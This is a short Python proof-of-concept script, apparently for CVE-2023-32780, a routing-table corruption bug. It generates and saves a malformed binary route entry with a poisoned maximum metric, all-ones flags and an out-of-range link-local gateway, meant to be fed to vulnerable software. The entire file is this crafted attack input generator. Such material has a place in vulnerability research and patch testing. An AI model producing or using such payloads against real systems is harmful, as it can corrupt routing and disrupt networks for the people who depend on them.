#!/usr/bin/env python3
"""CVE-2023-32780 — Routing-table corruption. Entry with a poisoned metric
and an out-of-range next-hop."""
import socket, struct, sys
from pathlib import Path

def build() -> bytes:
    # [dst][mask][gateway][metric:u32][flags:u16]
    return (socket.inet_aton("0.0.0.0")
            + socket.inet_aton("255.255.255.255")
            + socket.inet_aton("169.254.255.255")
            + struct.pack("<IH", 0xFFFFFFFF, 0xFFFF))

def main():
    out = Path(sys.argv[1] if len(sys.argv) > 1 else "cve-2023-32780.bin")
    data = build(); out.write_bytes(data)
    print(f"[+] CVE-2023-32780 route entry -> {out} ({len(data)} bytes)")

if __name__ == "__main__":
    main()
